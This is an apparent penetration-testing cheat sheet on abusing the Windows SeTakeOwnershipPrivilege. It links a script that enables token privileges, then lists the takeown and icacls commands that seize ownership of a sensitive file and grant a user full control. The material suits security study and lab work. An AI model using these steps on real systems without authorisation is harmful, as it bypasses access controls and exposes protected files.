# SeTakeOwnershipPrivilege

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**SeTakeOwnershipPrivilege**</mark> allows a user to <mark style="color:purple;">**assume ownership of any "securable object"**</mark>, including Active Directory objects, NTFS files and folders, printers, registry keys, services, and processes. This privilege grants <mark style="color:green;">`WRITE_OWNER`</mark> permissions on an object, enabling the user to modify its ownership within the security descriptor. By default, administrators possess this privilege. While it is uncommon for a standard user account to have this privilege, it may be assigned to service accounts responsible for tasks such as running backup jobs and managing VSS snapshots.

## <mark style="color:yellow;">Enable Privilege</mark>

For this we would use this script: [**\[LINK\]**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)

```powershell
PS C:\> Import-Module .\Enable-Privilege.ps1
PS C:\> .\EnableAllTokenPrivs.ps1
```

## <mark style="color:yellow;">Accessing sensible file</mark>

#### Checking directory ownership

```powershell
PS C:\> cmd /c dir /q 'C:\Share'
```

#### Taking ownership

```powershell
PS C:\> takeown /f 'C:\Shares\file.txt'
```

#### **Confirming Ownership Changed**

```powershell
PS C:\> Get-ChildItem -Path 'C:\Share\file.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

#### Modifying File's ACL

```powershell
PS C:\> icacls 'C:\Share\file.txt' /grant venator17:F
```
